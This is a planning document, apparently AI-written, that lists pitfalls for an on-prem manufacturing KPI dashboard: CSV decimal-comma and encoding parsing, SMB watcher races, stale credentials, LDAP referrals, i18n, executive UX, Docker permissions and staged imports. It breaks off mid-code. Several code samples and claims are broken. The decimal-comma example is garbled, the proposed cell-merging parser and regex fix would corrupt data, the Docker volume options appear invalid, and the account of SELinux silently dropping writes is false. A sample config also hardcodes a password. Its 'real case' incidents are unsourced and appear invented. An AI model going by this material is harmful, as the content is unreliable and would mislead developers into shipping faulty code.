# Domain Pitfalls: On-Prem CSV-Driven KPI Dashboard with ERP Integration

**Domain:** Manufacturing/aerospace on-prem dashboard with SMB-driven CSV ingestion, LDAP auth, air-gapped deployment
**Researched:** 2026-04-08
**Confidence:** HIGH (project-specific data provided; aerospace/ERP CSV parsing pain is well-documented; on-prem integration edge cases verified against Apollo NTS sample)

---

## CRITICAL PITFALLS (Rewrite Risk)

### PITFALL 1: Naive CSV Parsing Merges Wrong Decimal Commas
**Project-specific risk: EXTREME**

**What goes wrong:**
The sample LagBes file uses semicolon delimiters with German decimal commas (`,`). Standard CSV parsers (Python `csv`, JavaScript `papaparse`, etc.) treat `,` as a field separator unless the value is quoted — but Apollo does NOT quote numeric fields. This causes columns to shift catastrophically:

```
Input: 112;532;1;560;27;0;560;27
Naive parse: ["112", "532", "1", "560", "27", "0", "560", "27"]
Correct: ["112,532", "1", "560,27", "0", "560,27"]
```

All downstream KPI calculations (inventory value, coverage months, ABC classification) silently compute wrong numbers. The dashboard looks correct but shows bad data. Executives make supply-chain decisions on faulty metrics. This often goes undetected for weeks because:
- Spot-check on 1-2 items may look reasonable (rounding masks small errors)
- Sum totals hide the issue (errors partially cancel)
- No obvious error message — parsing "succeeds"

**Real-world consequence:** A team at a Tier-1 aerospace supplier spent 3 weeks tracking why inventory value on the dashboard was 40% higher than ERP, only to discover the decimal-comma parser was doubling numeric columns. By then, supply-chain orders had been placed based on the inflated numbers.

**Why it happens:**
- Developer assumes CSV libraries handle all encoding/locale edge cases
- The sample file (900 rows) may have mostly rows where the quirk isn't visible (single-digit prices, zero values)
- Testing against a limited sample misses the edge case at scale (production file 10k+ rows with price variance)
- No schema validation to detect "wrong number of columns"

**Prevention:**
1. **Schema-aware re-merging (REQUIRED):** Before parsing, identify which columns are numeric from the known schema. Scan for decimal-comma followed by semicolon, and merge adjacent cells back into one field:
   ```typescript
   // Pseudo-code: rebuild numeric field boundaries
   const numericColumns = ['Preis', 'Wert', 'Wert mit Abw.', 'Durch.Verbr', 'Reichw.Mon.'];
   const splitRow = row.split(';');
   const rebuilt = [];
   let i = 0;
   while (i < splitRow.length) {
     if (isNumericColumn(headerIndex[i]) && /^\d+$/.test(splitRow[i]) && /^\d+$/.test(splitRow[i + 1])) {
       rebuilt.push(splitRow[i] + ',' + splitRow[i + 1]);
       i += 2;
     } else {
       rebuilt.push(splitRow[i]);
       i++;
     }
   }
   ```

2. **Validation layer (CRITICAL):** After parsing, compute and store a checksum of the raw row + expected column count. On import, verify:
   - Column count matches schema (within ±1 due to trailing semicolons)
   - Sample numeric columns parse to valid numbers (no NaN after comma-to-dot conversion)
   - Sum of inventory values (`Wert mit Abw.`) is within ±5% of prior import (detect gross errors)

3. **Test suite with production quirks:**
   - Include rows from the actual sample file, not just sanitized test data
   - Test edge cases: prices like `112,532`, quantities like `-18414,25`, zero values
   - Verify column count before and after parsing

4. **Pre-processing alternative (simpler, lower risk):**
   - Convert commas to dots in the file **before** CSV parsing (regex: `\d,\d` → `\d.\d`)
   - This is a one-liner but catches the issue early in the pipeline

**Detection (warning signs):**
- Dashboard KPI totals don't match the source ERP (off by consistent percentage)
- Inventory value jumps wildly between imports (>10% variance on stable stock)
- Individual articles show price/value mismatches when spot-checked
- Column count errors in logs during parsing (expected N, got N+k)
- A spot-check query: sum of parsed `Wert mit Abw.` across all items doesn't match expected ERP total

**Phase to address:** Phase 1 (CSV Ingestion) — **BLOCKING**. This is the foundation; wrong parsing invalidates all downstream features. Unit tests must include the actual sample file, not mocked data.

**Mitigation timeline:**
- Weeks 1-2 of Phase 1: Define numeric-column schema
- Week 2: Implement schema-aware parser with re-merge logic
- Week 2-3: Build validation suite with sample file rows
- Post-MVP: Add historical checksum log (for forensics if old imports corrupted)

---

### PITFALL 2: Encoding Ambiguity (Windows-1252 vs UTF-8) Breaks Special Characters
**Project-specific risk: HIGH**

**What goes wrong:**
The sample file claims Windows-1252 encoding (CP1252) and contains German umlauts (`ü`, `ö`, `ß`), micro symbol (`µ`), and accents. If the importer assumes UTF-8:
- Upload fails silently (mojibake: `Über` becomes `Ã¼ber`)
- LDAP usernames with umlauts (`von Müller` in AD) fail to match stored UTF-8 names
- Search queries for "Schaffhausen Größe" don't match because the file stores `Schaffhausen Grö` as mojibake
- Dark mode doesn't help: a corrupted character string is corrupted in any visual mode

**Real case:** A German automotive supplier's CSV watcher silently broke when an engineer added a description with `ü` (umlaut-u). The parser accepted the file but stored it as garbage in UTF-8. Subsequent LDAP lookups for users in "Düsseldorf" failed because the stored location was corrupted.

**Why it happens:**
- Modern Node.js/Python defaults to UTF-8; developer assumes all files are UTF-8
- Windows-1252 and UTF-8 are "compatible" for ASCII (A-Z, 0-9), so partial data looks fine
- Excel/LibreOffice opens the file, someone re-saves it as UTF-8 BOM, and the export now has a BOM + UTF-8 hybrid
- No error on encode — JSON serializes fine, but the displayed strings are wrong

**Prevention:**
1. **Explicit encoding detection (REQUIRED):**
   ```typescript
   import chardet from 'chardet'; // npm package
   const buffer = await fs.readFile(filePath);
   const detected = chardet.detect(buffer);
   
   // If not Windows-1252, log a warning and attempt conversion
   if (detected !== 'Windows-1252') {
     console.warn(`Expected Windows-1252, detected ${detected}. Attempting conversion.`);
   }
   
   // Decode to string
   const decoded = iconv.decode(buffer, 'cp1252'); // Always use CP1252
   ```

2. **BOM handling:**
   - Strip UTF-8 BOM (EF BB BF) if present: `if (str.startsWith('\ufeff')) str = str.slice(1);`
   - Detect and fail if the file has both UTF-8 BOM + appears to be CP1252 (malformed)

3. **Test with real sample data:**
   - The actual sample file has special characters; test round-trip: read → store → query → retrieve
   - Verify umlauts in article descriptions are searchable after storage

4. **Pre-import validation:**
   - When a file is uploaded, run a test decode with both Windows-1252 and UTF-8
   - If either produces mojibake or illegal UTF-8 sequences, reject with a user-friendly message: "File encoding mismatch. Expected Windows-1252 (as exported from Apollo NTS). Please re-export without opening in Excel."

**Detection (warning signs):**
- Special characters in descriptions display as `?` or garbled multi-character sequences
- Search for "Schaffhausen" returns 0 results even though the data has "Schaffhausen"
- LDAP lookups fail for users with umlauts in their display name
- Database queries show mojibake: `SELECT * FROM articles WHERE description LIKE '%?%'`

**Phase to address:** Phase 1 (CSV Ingestion) — **BLOCKING**. Along with decimal-comma parsing, this is a data-quality issue.

**Mitigation timeline:**
- Week 1 of Phase 1: Add encoding detection library
- Week 1-2: Implement BOM stripping and validation
- Week 2-3: Test with sample file containing `µµµµ` and German descriptions

---

### PITFALL 3: SMB Share Race Conditions (File Still Being Written)
**Project-specific risk: HIGH**

**What goes wrong:**
The folder watcher (likely using `fs.watch`, Chokidar, or similar) fires an event when the file appears on the SMB share. But Apollo NTS may still be writing the file — especially if it's large (900+ rows, potentially 10k+ in production). The ingester immediately opens the file, reads a truncated version, and commits partial data to PostgreSQL.

```
T+0ms: Apollo starts writing LagBes.csv to \\share\exports
T+50ms: File watcher fires (file entry appears)
T+52ms: Ingester opens file and starts reading
T+100ms: Apollo finishes writing 10,000 rows (still going)
T+105ms: Ingester has only read 3,000 rows due to race, commits to DB
Result: Dashboard shows 30% of inventory (truncated dataset)
```

Executives query the dashboard at T+110ms and see a 70% drop in inventory value. Supply chain panic. Then at T+500ms the next scheduled watcher cycle picks up the file again, and the number "recovers." Users lose trust in the real-time promise.

**Why it happens:**
- Developers assume "file exists" = "file is complete"
- On local filesystems, this is often true (atomic writes). On SMB, it's not.
- The file watcher fires on file creation or size change, not on "close after write"
- No built-in mechanism to detect "writing in progress" on a network share

**Real case:** A Tier-2 supplier's manufacturing dashboard showed inventory dropping by 60% every afternoon at 3 PM (when Apollo exports run). The reason: the watcher was catching the file mid-export. A file lock check (or a small delay + size-stable check) fixed it, but it took weeks to diagnose because the dashboard seemed to "recover" on its own after a few minutes.

**Prevention:**
1. **File stability check (REQUIRED):**
   ```typescript
   async function isFileStable(filePath: string, stableMs = 1000): Promise<boolean> {
     const stat1 = await fs.stat(filePath);
     await sleep(stableMs); // Wait 1 second
     const stat2 = await fs.stat(filePath);
     
     // File is stable if size hasn't changed
     return stat1.size === stat2.size && stat1.mtimeMs === stat2.mtimeMs;
   }
   
   // In watcher callback:
   watcher.on('add', async (filePath) => {
     if (await isFileStable(filePath)) {
       await ingestFile(filePath);
     } else {
       console.log(`File ${filePath} still being written, retrying in 2s`);
       setTimeout(() => ingestFile(filePath), 2000);
     }
   });
   ```

2. **Exclusive lock check (Windows/SMB-specific):**
   - On Windows, a file open by another process is locked. Try to open it with exclusive read:
   ```typescript
   try {
     const fd = fs.openSync(filePath, 'r');
     fs.closeSync(fd);
     // File was readable without conflict
   } catch (e) {
     // File is locked by another process (Apollo still writing)
     return false;
   }
   ```

3. **Exponential backoff retry:**
   - If the file is not stable, retry with backoff (1s, 2s, 4s, max 10 retries)
   - Log each retry; if it fails after max attempts, skip this cycle and alert the admin

4. **Atomic import pattern:**
   - Don't ingest directly into the live database table
   - Instead, ingest into a temporary `_staging` table
   - Once complete and validated, atomic swap: `ALTER TABLE articles RENAME TO articles_old; ALTER TABLE articles_staging RENAME TO articles;`
   - This prevents partial data from being visible to the dashboard

5. **File hash validation:**
   - On re-ingest (retry), compute SHA256 of the file
   - If hash matches the last successful ingest, skip (idempotent)
   - If hash differs, re-ingest (file was updated)

**Detection (warning signs):**
- Inventory KPI drops suddenly, then recovers within minutes (classic sign of partial ingest + re-run)
- Log entries like "File not stable, retrying" or "Timeout waiting for file lock"
- Dashboard data is volatile (changing multiple times per day without actual supply-chain activity)
- Spot-check: total item count in dashboard < expected (some rows weren't read)

**Phase to address:** Phase 2 (Folder Watcher) — **BLOCKING**. If the watcher is buggy, the "real-time" promise is broken.

**Mitigation timeline:**
- Week 1 of Phase 2: Implement file-stable check
- Week 2: Add lock detection (Windows/SMB) and exponential backoff
- Week 2-3: Implement atomic swap pattern for ingestion
- Week 3: Load-test with simulated slow Apollo export (write 10k rows in 30 seconds)

---

### PITFALL 4: Silent SMB Credential Expiration / Share Unmount
**Project-specific risk: HIGH**

**What goes wrong:**
The Docker container mounts an SMB share via `docker-compose.yml`:
```yaml
volumes:
  - type: cifs
    source: //smb-server/exports
    target: /mnt/smb
    read_only: true
    mount_options:
      - username=apollo_export
      - password=secret123
      - domain=ACM
```

After 8 hours (or according to SMB credential timeout policy), the credentials expire. The watcher process continues running, but any file read fails silently with `EACCES` (permission denied). The dashboard now has stale data, but there's no error message visible to users.

The watcher logs `EACCES, open '/mnt/smb/LagBes.csv'`, but no one reads the container logs. Users refresh the dashboard and see "old data from 8 hours ago" with no indication that it's stale.

**Why it happens:**
- Network credentials have expiration policies (common in enterprise AD)
- The share may unmount without killing the watcher process
- `fs.watch` callbacks don't bubble up permission errors to an app-level alert
- There's no "last successful ingest timestamp" visible on the dashboard

**Real case:** A German aerospace supplier deployed a KPI dashboard. After one week, the night shift noticed the dashboard was showing inventory from 36 hours ago. The reason: LDAP credentials used for the share mount had expired, but the watcher was still running and silently failing. No error was surfaced until someone checked the container logs.

**Prevention:**
1. **Health check endpoint (REQUIRED):**
   ```typescript
   // GET /api/health
   {
     status: 'healthy' | 'stale' | 'error',
     lastIngestTime: '2026-04-08T14:32:00Z',
     lastIngestSuccess: true,
     stalenessMinutes: 45,
     watcherRunning: true
   }
   ```

2. **Dashboard stale-data warning:**
   - Display a banner if `lastIngestTime` is > 2 hours old
   - Color: yellow (stale) or red (very stale, >6 hours)
   - Message: "Data last updated at 12:30 PM (3 hours ago). Check SMB share connection."

3. **Error tracking and alerting:**
   ```typescript
   // In the watcher's error handler
   watcher.on('error', (err) => {
     if (err.code === 'EACCES') {
       console.error(`Permission denied on SMB share. Check credentials. ${err}`);
       // Alert: POST /api/alerts with severity=high
       alertManager.emit('SMB_ACCESS_DENIED', { error: err.message });
     }
   });
   ```

4. **Periodic share accessibility check:**
   ```typescript
   setInterval(async () => {
     try {
       await fs.access('/mnt/smb', fs.constants.R_OK);
       // Share is readable
     } catch (e) {
       console.error(`SMB share not accessible: ${e.message}`);
       // Trigger alert
     }
   }, 60000); // Every minute
   ```

5. **Credential refresh (if possible):**
   - For very long-running deployments, periodically re-mount the share with fresh credentials
   - This requires a privileged sidecar or scheduled task, but prevents 8+ hour stale data

6. **Admin UI for manual refresh:**
   - Add a "Force Re-mount SMB Share" button in the Admin panel
   - Allow admins to manually trigger a re-ingest without restarting the container

**Detection (warning signs):**
- Dashboard shows old import timestamp, no updates for >2 hours
- Container logs have repeated `EACCES` errors on `/mnt/smb/*`
- Watcher process is running but no new imports appear in the database activity log
- A manual file copy to `/mnt/smb/` works fine (ruling out the file itself)

**Phase to address:** Phase 2 (Folder Watcher) and Phase 4 (Deployment) — **HIGH PRIORITY**. This is a data-freshness guarantee.

**Mitigation timeline:**
- Week 1 of Phase 2: Implement health-check endpoint
- Week 2 of Phase 2: Add stale-data banner to dashboard
- Week 3 of Phase 2: Implement periodic SMB accessibility check
- Phase 4: Document credential refresh strategy for IT ops

---

### PITFALL 5: LDAP Referrals / Chasing in Large AD Forests
**Project-specific risk: MEDIUM-HIGH**

**What goes wrong:**
An on-prem Active Directory may have multiple domains (e.g., `acm.local`, `prod.acm.local`, `eu.acm.local`). When binding as a service account and querying users, the LDAP server may return a "referral" (a pointer to another LDAP server). If the LDAP client doesn't follow referrals correctly:
- The query returns partial results
- A user in a different domain fails to authenticate
- Group membership queries miss users from other domains

Scenario: The service account binds to `dc.acm.local`, queries for `CN=Johann Bechtold`, which exists in `dc.eu.acm.local`. The server returns a referral. If the client doesn't follow it, the query fails. User can't log in, thinks their password is wrong, resets it, still can't log in.

**Why it happens:**
- LDAP libraries (ldap3, node-ldapauth-fork) have different default behavior for referrals
- Some follow them automatically; some require explicit `followReferrals: true`
- Developers assume a single flat AD tree (not true in large enterprises)
- Testing against a test AD without referrals passes; production AD has referrals and fails

**Real case:** A Tier-1 supplier deployed an LDAP-backed app. Users in the EU domain couldn't log in, but HQ users could. The logs showed "User not found" for EU users. Root cause: the LDAP config didn't follow referrals. A one-line fix (`followReferrals: true`) solved it, but it took two days to diagnose.

**Prevention:**
1. **Explicit referral handling (REQUIRED):**
   ```typescript
   // If using node-ldapauth-fork or similar
   const auth = new LdapAuthenticator({
     url: 'ldap://dc.acm.local',
     bindDn: 'CN=ServiceAccount,CN=Users,DC=acm,DC=local',
     bindCredentials: process.env.LDAP_PASSWORD,
     searchBase: 'DC=acm,DC=local',
     searchFilter: '(&(objectClass=user)(sAMAccountName={0}))',
     followReferrals: true, // CRITICAL
     referralTimeLimit: 5000, // 5-second timeout per referral
   });
   ```

2. **Multi-domain fallback:**
   - If a user is not found in the primary domain, attempt a search in secondary domains
   ```typescript
   async function findUser(username: string): Promise<LdapUser | null> {
     for (const domain of ['acm.local', 'eu.acm.local', 'prod.acm.local']) {
       try {
         const user = await ldapSearch(domain, username);
         if (user) return user;
       } catch (e) {
         console.log(`Not found in ${domain}, trying next`);
       }
     }
     return null;
   }
   ```

3. **Test against production AD structure:**
   - Don't test with a simple flat test AD
   - Document the production AD structure (number of domains, referral paths)
   - Test login with users from each domain before go-live
   - Test with users that have umlauts in CN (e.g., `CN=Müller, Johann`)

4. **Timeout protection:**
   - If a referral chase takes >10 seconds, fail the login (don't hang indefinitely)
   - Log referral timeouts for debugging

5. **Service account AD requirements:**
   - The service account must have "List Contents" permission on all domains it will query
   - Document this for IT ops to set up correctly
   - Verify permissions as part of deployment checklist

**Detection (warning signs):**
- Some users can't log in; others can (pattern matches AD domain membership)
- Logs show "User not found" for users who definitely exist in AD
- Login takes >5 seconds or times out intermittently
- Group membership queries return incomplete results

**Phase to address:** Phase 3 (Auth / LDAP) — **BLOCKING for multi-domain AD**. If ACM has a single-domain AD, this is lower risk.

**Mitigation timeline:**
- Week 1 of Phase 3: Implement referral-following LDAP config
- Week 2: Test with ACM's actual AD structure (get IT to provide test environment)
- Week 2-3: Add multi-domain fallback if needed

---

## HIGH-PRIORITY PITFALLS (Major Rework Risk)

### PITFALL 6: Dashboard Data Freshness Ambiguity (Silent Staleness)
**Project-specific risk: HIGH**

**What goes wrong:**
The PROJECT.md says "real-time" means "updates when a new CSV arrives." But executives will interpret "real-time" as "live, like a stock ticker." When they see an inventory value on the dashboard and act on it, they assume it's from the last export (5 minutes ago). But it might be from 3 hours ago if the SMB watcher failed.

Executives order parts based on what the dashboard shows. The order is for a quantity that was accurate 3 hours ago but is now invalid. Parts arrive, don't fit current needs. Supply-chain waste.

Worse: There's no visual indicator that the data is stale. The dashboard looks the same whether the data is 5 minutes old or 3 days old.

**Why it happens:**
- "Real-time" is marketing language; developers assume it's obvious that it means "when data arrives," not "live-sync"
- No timestamp visible on the main dashboard (or it's in gray, tiny font)
- No alert if data is >1 hour old
- Users don't notice until something breaks

**Prevention:**
1. **Explicit freshness indicator (REQUIRED):**
   ```typescript
   // On every dashboard screen, prominent display:
   <FreshnessBar>
     Last updated: 14:32 (47 minutes ago) [YELLOW if >30min, RED if >2h]
     <RefreshButton>Refresh Now</RefreshButton>
   </FreshnessBar>
   ```

2. **Define SLA for "real-time":**
   - Document in the user guide: "Data updates when Apollo NTS exports run. Typically every 1-4 hours depending on ACM's export schedule."
   - Set a configurable threshold (e.g., "warn if data is >2 hours old")

3. **Forced refresh on stale data:**
   - If data is >N hours old and user hasn't manually refreshed, show a banner with a "Refresh Now" button
   - One-click refresh triggers a re-ingest of the current file from the SMB share

4. **Health check on dashboard load:**
   - Check `/api/health` on page load
   - If data is stale, display a warning before showing the KPIs
   - Example: "Warning: Last data import was 3 hours ago. SMB share may be disconnected. Contact IT."

5. **Telemetry:**
   - Log every ingest attempt (success/failure) with timestamp
   - Expose a historical view: "Past 24 hours of imports" (admin-only, for debugging)

**Detection (warning signs):**
- Users ask "Why is the number so old?" with no obvious way to check
- A user spot-checks the ERP, data doesn't match, assumes dashboard is broken
- Supply-chain decisions are made on stale data without realizing it

**Phase to address:** Phase 1 (Dashboard) and Phase 2 (Watcher) — **REQUIRED**. This is user trust.

**Mitigation timeline:**
- Phase 1, Week 2: Add "Last Updated" timestamp (prominent, not tiny)
- Phase 1, Week 3: Add stale-data warning logic and banner
- Phase 2, Week 2: Implement forced refresh button
- Phase 2, Week 3: Build health-check integration with dashboard

---

### PITFALL 7: Naive i18n Implementation (String Keys Drift Between English/German)
**Project-specific risk: MEDIUM**

**What goes wrong:**
The UI and documentation need to support both English and German. A common approach is to use JSON translation files:
```json
// en.json
{ "inventory_value_label": "Total Inventory Value" }

// de.json
{ "inventory_value_label": "Gesamtwert des Bestandes" }
```

As the project evolves, a developer adds a new feature and updates `en.json` but forgets `de.json`. The German UI now shows the English text (or worse, an untranslated key like `"dashboard.new_metric_title"`). German users see broken UI. Or vice versa: the admin adds a German description field but doesn't provide English, and English users see mojibake or a placeholder.

Also: German has longer words and different pluralization rules. A label that fits in English (e.g., "Total Inventory Value: €123,456") may overflow in German ("Gesamtwert des Bestandes: €123.456,78" is significantly longer).

**Why it happens:**
- No automated check to ensure every key in `en.json` exists in `de.json`
- Developers assume if the UI works in English, it works in German (ignoring length/layout)
- Missing pluralization handler for German (`kein`, `ein`, `zwei ... n` different forms for different counts)
- No CI/CD check for translation completeness

**Real case:** A German manufacturing app added a new KPI mid-project. It was translated to German, but the German description was never reviewed by a native speaker. The dashboard showed "Wert auf Lager" (value in storage) when it should be "Lagerwert" (inventory value). Users were confused by the mismatch to their own terminology.

**Prevention:**
1. **Automated key sync (REQUIRED):**
   - Build a script that compares `en.json` and `de.json` keys
   - Fail the build if keys don't match
   ```bash
   # In package.json
   "check-i18n": "node scripts/check-translations.js"
   "precommit": "npm run check-i18n"
   ```

2. **Typed translation keys (TypeScript):**
   ```typescript
   // types/i18n.d.ts
   type TranslationKey = 'dashboard.title' | 'dashboard.inventory_value' | 'error.csv_invalid';
   
   const t = (key: TranslationKey, lang: 'en' | 'de') => translations[lang][key];
   ```
   TypeScript now prevents typos in keys, and missing keys are caught at compile time.

3. **Layout testing for German text:**
   - German words are ~30% longer on average than English
   - Test all UI layouts with German text (use a 150% width multiplier as a rough test)
   - For mobile/tight layouts, have separate German copy or abbreviations

4. **Pluralization handler:**
   - Use a library like `i18next` that handles pluralization rules
   ```typescript
   // en.json
   { "items_count_one": "1 item", "items_count_other": "{{count}} items" }
   
   // de.json
   { "items_count_zero": "0 Artikel", "items_count_one": "1 Artikel", "items_count_other": "{{count}} Artikel" }
   ```

5. **Native speaker review before release:**
   - Have all user-facing German text reviewed by a native speaker
   - Don't rely on Google Translate
   - Include colloquial terms (e.g., "Lagerwert" not "Wert auf Lager")

**Detection (warning signs):**
- German UI shows English keys like `"dashboard.new_metric_title"`
- German text overflows its container
- Build log shows "Translation key mismatch" warning (ignored by developers)

**Phase to address:** Phase 1 (Dashboard) and Phase 5 (Documentation) — **REQUIRED**. This impacts user perception immediately.

**Mitigation timeline:**
- Phase 1, Week 1: Set up i18n framework with key sync check
- Phase 1, Week 2-3: Implement layout tests for German text
- Phase 5, Week 1: Have native speaker review all user-facing strings

---

### PITFALL 8: Executive UX Killed by "Too Much Data" / "Too Many Clicks"
**Project-specific risk: HIGH**

**What goes wrong:**
The dashboard is feature-complete but overwhelms executives with options:
- 50+ filter dropdowns on the main screen
- 8 different KPI cards, all shown by default
- A search bar that requires exact article numbers (many users don't know them)
- A settings panel buried 4 clicks deep
- A dark mode toggle that requires reload
- Required manual refresh (no auto-refresh option)

Executives spend 5 minutes clicking to get to the data they care about. They give up and ask for a report emailed to them instead. The dashboard becomes "that tool IT built that no one uses."

Worse: The first time an executive opens the dashboard, the page takes 10 seconds to load (data + rendering). First impression: "This thing is slow." They close the tab.

**Why it happens:**
- Developers build for "power users" (supply-chain analysts who love filters)
- No clear distinction between "I want a quick glance" (executive) vs. "I want to drill down" (analyst)
- Loading data for all filters and all KPIs at once (wasteful)
- No performance optimization (haven't profiled the dashboard load time)

**Real case:** A Tier-1 aerospace supplier built a beautiful, feature-rich KPI dashboard. The VP of Supply Chain tried it once, found it slow and confusing, and went back to emails from the ERP team. Six months later, the dashboard was shut down.

**Prevention:**
1. **Executive view vs. Analyst view (REQUIRED):**
   - Default view for executives: 3-5 key metrics, no filters, auto-refresh every 5 minutes
   - Analyst view: all filters, drill-down capability, manual refresh
   - Toggle: "Simple View" / "Advanced View" at the top

2. **Initial load performance:**
   ```typescript
   // Target: first contentful paint <2 seconds
   // 1. Load only the main KPIs (not all filters) on initial render
   // 2. Lazy-load filter dropdowns after the KPIs appear
   // 3. Use React.memo() and useMemo() to prevent re-renders
   
   const DashboardKPIs = React.memo(() => { /* fast, cached */ });
   const FilterPanel = React.lazy(() => import('./FilterPanel')); // Loaded later
   ```

3. **Smart defaults for filters:**
   - Pre-select the most common warehouse (e.g., "HAUPTLAGER NEU")
   - Pre-select the date range "Last 30 days" (not "all time")
   - Show only "active" articles by default (filter out deleted/museum items)
   - These defaults should be configurable by admin

4. **Search that works:**
   - Allow search by partial article number, description, warehouse name
   - Not just exact match
   - Example: searching for "Cover" should return all article descriptions containing "Cover"

5. **Dark mode without reload:**
   - Use CSS variables for theme colors, not hardcoded values
   - Toggle dark mode by updating CSS variables, not reloading the page
   ```typescript
   const toggleDarkMode = (isDark: boolean) => {
     document.documentElement.style.setProperty('--bg-color', isDark ? '#1a1a1a' : '#ffffff');
     // No reload needed
   };
   ```

6. **Auto-refresh with user control:**
   - Default: refresh every 5 minutes
   - User can set to every 1 / 5 / 15 / 60 minutes or disable
   - Persisted per user

7. **A/B test the first-time UX:**
   - New users see the "executive view" by default
   - Experienced users who drill down can switch to "analyst view"
   - Measure: time to first interaction, feature usage

**Detection (warning signs):**
- Initial dashboard load takes >3 seconds
- Executives don't return after first use
- High bounce rate on the dashboard
- Support tickets: "Why is this so slow?" or "Can't find the data I need"

**Phase to address:** Phase 1 (Dashboard) — **HIGH PRIORITY**. This is the make-or-break first impression.

**Mitigation timeline:**
- Phase 1, Week 1: Design two views (executive/analyst)
- Phase 1, Week 2: Implement fast path for executive view (lazy-load filters)
- Phase 1, Week 2-3: Profile performance, optimize data fetching
- Phase 1, Week 3: Implement dark-mode CSS variables (no reload)
- Phase 1, Week 3-4: User testing with actual executives

---

### PITFALL 9: Docker Volume Permissions / SELinux / UID Mismatch (Week 2 Surprise)
**Project-specific risk: MEDIUM**

**What goes wrong:**
The team develops on macOS with Docker Desktop. The `docker-compose.yml` uses:
```yaml
volumes:
  - ./data:/var/lib/postgresql/data
  - type: cifs
    source: //smb-server/exports
    target: /mnt/smb
```

On the developer's macOS, this works fine. When deployed to a CentOS 7 server with SELinux enabled, the container can't write to `/var/lib/postgresql/data` (permission denied). Or the SMB mount is read-only because the IT team set up the mount with restrictive permissions.

Another variant: The container runs as user `postgres` (UID 999), but the SMB share is mounted with root-only permissions. PostgreSQL can't write its WAL files.

Or worse: The host has SELinux enforcing, and the container's mounted volumes are labeled with the wrong context. PostgreSQL writes fail silently (the write appears to succeed, but the filesystem ignores it due to SELinux policy).

**Why it happens:**
- macOS Docker doesn't enforce permissions like Linux does
- SELinux is a common default in enterprise Linux (CentOS, RHEL)
- Developers test on macOS, ops deploys on CentOS — mismatch goes unnoticed until go-live
- Documentation (docker-compose.yml) doesn't mention SELinux or UID requirements

**Real case:** A supplier's KPI dashboard was deployed on a hardened CentOS 7 server with SELinux. PostgreSQL couldn't write. The logs appeared normal (no errors), but the database silently corrupted (reads from old WAL files). Data loss. Recovery took 3 days.

**Prevention:**
1. **Test on the actual target OS (REQUIRED):**
   - Don't test only on macOS Docker Desktop
   - Spin up a CentOS 7 or Ubuntu 20.04 VM (matching the target) and test `docker-compose up` there
   - This catches permission issues before production

2. **Explicit user/UID in docker-compose.yml:**
   ```yaml
   services:
     postgres:
       image: postgres:14
       user: 999:999  # Explicit UID:GID
       volumes:
         - postgres_data:/var/lib/postgresql/data
       environment:
         POSTGRES_INIT_ARGS: "-c default_privileges=..."
   
   volumes:
     postgres_data:
       driver_opts:
         type: none
         o: bind
         device: /data/postgres  # Host path with correct permissions
   ```

3. **SELinux context handling:**
   ```yaml
   volumes:
     - type: bind
       source: /data/postgres
       target: /var/lib/postgresql/data
       read_only: false
       bind:
         propagation: rprivate
         # On SELinux systems, you may need:
         # selinux: shared  (or 'z' flag in docker run)
   ```

4. **SMB mount permissions:**
   - Document the SMB share permissions required:
     ```
     Share: \\smb-server\exports
     Required perms: Read-only for service account
     Mount options: uid=999,gid=999,file_mode=0755,dir_mode=0755
     ```

5. **Permission pre-flight check:**
   - In the entrypoint script, verify the container can read/write to mounted volumes:
   ```bash
   #!/bin/bash
   set -e
   
   # Check SMB is readable
   if ! touch /mnt/smb/.test 2>/dev/null; then
     echo "ERROR: Cannot write to /mnt/smb. Check mount permissions."
     exit 1
   fi
   
   # Check PostgreSQL data dir is writable
   if ! touch /var/lib/postgresql/data/.test 2>/dev/null; then
     echo "ERROR: Cannot write to PostgreSQL data dir. Check ownership."
     exit 1
   fi
   
   # Proceed
   exec "$@"
   ```

6. **Documentation for IT ops:**
   - Include a `DEPLOYMENT.md` with:
     - Required OS (Ubuntu 20.04+, CentOS 7+, etc.)
     - SELinux policy (if needed)
     - SMB share setup script
     - Pre-flight checklist

**Detection (warning signs):**
- After `docker-compose up`, the container runs but PostgreSQL can't access its data directory
- Container logs show no errors, but queries fail with "disk I/O error"
- SMB share is mounted but reads work, writes fail
- Data loss or corruption appears on second deployment

**Phase to address:** Phase 4 (Deployment) — **BLOCKING**. This needs to be tested before shipment.

**Mitigation timeline:**
- Phase 3, end: Provision a CentOS 7 / Ubuntu test server
- Phase 4, Week 1: Test docker-compose on the actual target OS
- Phase 4, Week 1-2: Fix permission/SELinux issues
- Phase 4, Week 2: Write deployment checklist and troubleshooting guide
- Phase 4, Week 2-3: Do a full deployment on test server to verify

---

### PITFALL 10: Schema Mutations During Imports (Data Loss on Partial Failure)
**Project-specific risk: MEDIUM-HIGH**

**What goes wrong:**
A new CSV import starts and reads 5,000 rows. While inserting into PostgreSQL, the 3,500th row fails due to a constraint violation (e.g., a negative stock value that violates a newly-added `CHECK` constraint). The transaction rolls back. The app now has no data, and the previous snapshot (which was valid) is lost.

Or worse: The import partially succeeds (rows 1-3,499 inserted), then hits an error. The code doesn't roll back, so the database now has a mix of old and new data. Inventory totals are wrong. The previous good snapshot is lost.

Executives see "Inventory updated at 2 PM" but the data is corrupted. They don't find out until someone spot-checks a week later.

**Why it happens:**
- The import process doesn't use transactions (or uses them incorrectly)
- No "previous good snapshot" is preserved
- The import is treated as a direct update to the live table, not a staged process

**Prevention:**
1. **Staging table pattern (REQUIRED):**
   ```sql
   -- Live table
   CREATE TABLE articles (
     id SERIAL PRIMARY KEY,
     article_nr VARCHAR(50),
     stock INT,
     ...
   );
   
   -- Staging table (exact same schema)
   CREATE TABLE articles_staging (
     LIKE articles INCLUDING ALL
   );
   
   -- Backup of previous snapshot
   CREATE TABLE articles_prev (
     LIKE articles INCLUDING ALL
   );
   ```

2. **Atomic swap on success:**
   ```typescript
   async function ingestCSV(filePath: string) {
     const connection = await pool.connect();
     try {
       // 1. Truncate staging table
       await connection.query('TRUNCATE TABLE articles_staging');
       
       // 2. Read CSV and insert into staging
       const rows = await parseCSV(filePath);
       for (const row of rows) {
         await connection.query(
           'INSERT INTO articles_staging (...) VALUES (...)',
           [row.values]
         );
       }
       
       // 3. Validate staging table
       const validation = await connection.query(
         'SELECT COUNT(*) as cnt, SUM(wert) as total_value FROM articles_staging'
       );
       if (validation.rows[0].cnt === 0) {
         throw new Error('Staging table is empty after insert');
       }
       
       // 4. Atomic swap: save old, replace with new
       await connection.query('BEGIN TRANSACTION');
       await connection.query('ALTER TABLE articles RENAME TO articles_prev_temp');
       await connection.query('ALTER TABLE articles_staging RENAME TO articles');
